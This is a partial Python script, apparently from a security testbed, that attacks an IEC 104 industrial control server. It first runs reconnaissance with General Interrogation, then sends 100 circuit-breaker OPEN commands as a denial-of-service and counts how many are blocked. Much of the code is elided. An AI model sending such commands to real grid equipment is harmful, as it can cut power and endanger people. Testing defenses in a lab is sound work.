#!/usr/bin/env python3
"""
IEC104 Attacker - Secure Phase Testing
...
def run_iec104_attacker():
    print("=" * 60)
    print("  IEC104 ATTACKER - SECURE PHASE TESTING")
    print("=" * 60)
    ...
    while True:
        ...
        try:
            print(f"[TARGET] {TARGET_HOST}:2404")
            ...
            while connection.state != c104.ConnectionState.OPEN:
                print(f"[WAIT] Đang chờ IEC104 server tại {connection.ip}:{connection.port} ...")
                time.sleep(3)
                retries += 1
                if retries > 10:
            ...
            print(f"[OK] Kết nối thành công đến IEC104 Server!")

            # Phase 1: Reconnaissance - General Interrogation
            print("\n[PHASE 1] Quét: gửi General Interrogation...")
            stats["total_attempts"] += 1
            ...
            # Phase 2: DoS Attack - Open Breaker
            if gi_ok:
                print("\n[PHASE 2] Tấn công DoS: Gửi lệnh OPEN cầu dao x 100 lần...")
                success_count = 0
                blocked_count = 0
                ...
                for i in range(100):
                    ...
                    try:
                        ...
                        if ok:
                            ...
                            push_metric("write", "open_cmd_value", 0)
                        else:
                            blocked_count += 1
                ...
                print("[SKIP] Bỏ qua Phase 2 do GI thất bại.")
